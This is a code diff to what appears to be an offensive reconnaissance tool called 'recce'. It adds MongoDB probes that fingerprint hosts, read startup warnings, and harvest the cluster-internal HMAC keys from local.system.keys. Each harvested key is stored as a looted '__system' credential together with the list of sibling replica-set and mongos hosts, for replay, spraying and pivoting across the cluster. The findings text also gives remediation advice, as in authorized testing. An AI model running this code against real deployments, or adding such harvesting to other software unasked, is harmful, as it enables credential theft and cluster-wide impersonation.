@@ -489,6 +489,57 @@ def _deep_mongo(sock, out: dict, timeout: float) -> None:
             inv[name] = colls[:20]
     if inv:
         out["collection_inventory"] = inv
+    # hostInfo: OS fingerprint + FQDN. Unauth-readable on exposed instances and
+    # readable by any principal with hostManager/clusterMonitor. One BSON round
+    # trip; feeds cross-service hostname / OS-family pools.
+    hi = _cmd(sock, "hostInfo", 30, timeout)
+    if isinstance(hi, dict) and hi.get("ok") == 1.0:
+        sysd = hi.get("system") if isinstance(hi.get("system"), dict) else {}
+        osd = hi.get("os") if isinstance(hi.get("os"), dict) else {}
+        info = {
+            "hostname": str(sysd.get("hostname", "") or ""),
+            "os_type": str(osd.get("type", "") or ""),
+            "os_name": str(osd.get("name", "") or ""),
+            "os_version": str(osd.get("version", "") or ""),
+        }
+        if any(info.values()):
+            out["host_info"] = info
+    # getLog: 'startupWarnings' — the server's OWN list of insecure-config
+    # warnings ('access control not enabled', 'listening on all interfaces',
+    # THP misconfigured, mmapv1 deprecated, weak TLS, ...). Unauth-readable on
+    # exposed instances. Free finding: the server tells you what is wrong.
+    gl = command(sock, bson_doc(_e_str("getLog", "startupWarnings"),
+                                _e_str("$db", "admin")), 31, timeout)
+    if isinstance(gl, dict) and gl.get("ok") == 1.0:
+        lines = gl.get("log")
+        if isinstance(lines, list):
+            warnings = [ln for ln in lines if isinstance(ln, str) and ln.strip()]
+            if warnings:
+                out["startup_warnings"] = warnings[:40]     # cap
+    # local.system.keys: the cluster-internal HMAC keys (post-3.6 keyfile
+    # replacement). Reading them yields the `__system` cluster credential —
+    # replay to every replset member / mongos. `find` on local.system.keys
+    # returns docs with _id (keyId int64), purpose ('HMAC'), key (BinData), and
+    # expiresAt. Only harvestable on unauth exposures or accounts with `read`
+    # on `local`; either is a critical primitive.
+    ck = command(sock, bson_doc(_e_str("find", "system.keys"),
+                                _e_int32("limit", 10),
+                                _e_str("$db", "local")), 32, timeout)
+    if isinstance(ck, dict) and ck.get("ok") == 1.0:
+        docs = _batch((ck.get("cursor") or {}).get("firstBatch"))
+        keys = []
+        for d in docs:
+            kv = d.get("key")
+            if isinstance(kv, (bytes, bytearray)) and len(kv) >= 8:
+                import base64 as _b64
+                keys.append({
+                    "keyId": str(d.get("_id", "")),
+                    "purpose": str(d.get("purpose", "") or ""),
+                    "key_b64": _b64.b64encode(bytes(kv)).decode(),
+                    "key_len": len(kv),
+                })
+        if keys:
+            out["cluster_keys"] = keys
 
 
 # --- probe ----------------------------------------------------------------------
@@ -565,6 +616,25 @@ _NARRATIVE = {
         "mongos + config-server addresses are now known to the attacker — same "
         "credentials or exposure typically apply cluster-wide, so this is a "
         "lateral-target inventory. Bind the cluster interfaces to a trusted network."),
+    "mongo_hostinfo": (
+        "The MongoDB instance disclosed a full OS/host fingerprint via hostInfo: "
+        "OS name and version, kernel type, and the server's own hostname (often "
+        "the internal FQDN). Feeds SSH/SMB/RDP spraying with the exact hostname, "
+        "and picks Linux-vs-Windows follow-on. Restrict hostInfo to trusted roles "
+        "and remove the unauth exposure."),
+    "mongo_startup_warnings": (
+        "The MongoDB server itself reports insecure-configuration warnings via "
+        "getLog:'startupWarnings' - auth-off, all-interfaces bind, weak TLS, "
+        "deprecated storage engines, and similar. Treat every listed line as an "
+        "explicit misconfiguration finding to remediate."),
+    "mongo_cluster_keyfile": (
+        "The instance exposed local.system.keys - the cluster-internal HMAC "
+        "keys used by every mongod/mongos node to authenticate to each other "
+        "as the reserved `__system` account. Replaying this key against any "
+        "replica-set member or mongos yields cluster-wide impersonation and, "
+        "with __system's implicit privileges, effective RCE-adjacent lateral "
+        "movement across the entire deployment. Bind local to a trusted "
+        "network, enforce auth on every node, and rotate the keyFile."),
     "mongo_collection_inventory": (
         "recce enumerated collection names across every accessible database. Even "
         "when individual documents don't obviously leak PII, the collection names "
@@ -748,6 +818,75 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "listCollections from the app role); bind to a trusted "
                     "interface.",
                     ["CWE-200"], kind="mongo_collection_inventory"))
+            hinfo = pr.get("host_info") or {}
+            if hinfo and (hinfo.get("hostname") or hinfo.get("os_name")):
+                bits = []
+                if hinfo.get("hostname"):
+                    bits.append(f"hostname={hinfo['hostname']}")
+                if hinfo.get("os_type"):
+                    bits.append(f"os_type={hinfo['os_type']}")
+                if hinfo.get("os_name"):
+                    bits.append(f"os={hinfo['os_name']}")
+                if hinfo.get("os_version"):
+                    bits.append(f"version={hinfo['os_version']}")
+                out.append(_finding(
+                    "medium", "MongoDB host / OS fingerprint disclosed (hostInfo)", tgt,
+                    "recce read hostInfo without a specific privilege - the server "
+                    "returned its own OS fingerprint and hostname: "
+                    + ", ".join(bits) + ".",
+                    "mongosh",
+                    f"mongosh mongodb://{h.ip}:{p.portid}/ --eval "
+                    "'db.adminCommand({hostInfo:1})'",
+                    "Restrict the hostInfo command to trusted roles "
+                    "(hostManager/clusterMonitor) and remove any unauth exposure.",
+                    ["CWE-200"], kind="mongo_hostinfo"))
+            warns = pr.get("startup_warnings") or []
+            if warns:
+                # De-dupe by 'msg' body; startup log lines often include a
+                # timestamp that would otherwise inflate the count.
+                seen_w: set = set()
+                short = []
+                for w in warns:
+                    key = w[-200:] if len(w) > 200 else w
+                    if key not in seen_w:
+                        seen_w.add(key)
+                        short.append(w)
+                head = "\n".join("  - " + w for w in short[:6])
+                out.append(_finding(
+                    "medium",
+                    "MongoDB self-reported startup warnings (misconfiguration)", tgt,
+                    f"getLog:'startupWarnings' returned {len(short)} warning "
+                    "line(s) from the server's own start-up log — the server is "
+                    "telling you what is misconfigured:\n\n" + head
+                    + ("\n  ..." if len(short) > 6 else ""),
+                    "mongosh",
+                    f"mongosh mongodb://{h.ip}:{p.portid}/ --eval "
+                    "'db.adminCommand({getLog:\"startupWarnings\"})'",
+                    "Remediate each listed warning (enable auth, bind to a "
+                    "trusted interface, drop deprecated storage engines, fix "
+                    "TLS / ulimit / THP settings).",
+                    ["CWE-532", "CWE-16"], kind="mongo_startup_warnings"))
+            cks = pr.get("cluster_keys") or []
+            if cks:
+                sample = cks[0]
+                out.append(_finding(
+                    "critical",
+                    "MongoDB cluster keyfile secret exposed (local.system.keys)", tgt,
+                    f"recce read {len(cks)} cluster HMAC key(s) from "
+                    "local.system.keys — the internal-auth secret every "
+                    "replica-set member and mongos uses to authenticate to each "
+                    "other as the reserved `__system` account. Replay against "
+                    "any node yields cluster-wide impersonation."
+                    f"\n\nSample keyId={sample.get('keyId', '?')} "
+                    f"purpose={sample.get('purpose', '?')} "
+                    f"key_len={sample.get('key_len', 0)} bytes (redacted).",
+                    "mongosh",
+                    f"mongosh mongodb://{h.ip}:{p.portid}/local --eval "
+                    "'db.system.keys.find().toArray()'",
+                    "Bind the `local` database to a trusted interface, enforce "
+                    "authentication on every node, restrict `local` reads to "
+                    "cluster-admin roles, and rotate the keyFile.",
+                    ["CWE-798", "CWE-522"], kind="mongo_cluster_keyfile"))
             dm = pr.get("datamine")
             if dm and dm.get("secret_fields"):
                 sf = dm["secret_fields"]
@@ -876,6 +1015,24 @@ def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
                         username="(embedded)", secret=cs, kind="password",
                         source="mongodb-datamine", origin_ip=t["ip"],
                         notes=f"connection string mined from MongoDB :{t['port']}"))
+            # local.system.keys: the cluster-internal `__system` credential.
+            # Publish one Credential per key so the wider engagement's spray /
+            # relay pools can replay it against every replica-set member and
+            # every mongos. The 'notes' field carries the sibling member list
+            # so pivot code has an inline target inventory.
+            cks = pr.get("cluster_keys") or []
+            if cks:
+                relay = ", ".join(sorted({m for m in
+                                          (pr.get("replset_members") or [])
+                                          + (pr.get("shard_hosts") or []) if m}))
+                for k in cks:
+                    looted.append(Credential(
+                        username="__system", secret=k.get("key_b64", ""),
+                        kind="password", source="mongodb-keyfile",
+                        origin_ip=t["ip"],
+                        notes=("MongoDB cluster keyfile secret (local.system.keys "
+                               f"keyId={k.get('keyId', '?')}); replay as __system "
+                               f"against replset/mongos: {relay or 'unknown'}").rstrip()))
             for hh in pr.get("hashes", []):
                 looted.append(Credential(
                     username=hh["user"], secret=hh["hashcat"], kind="hash",
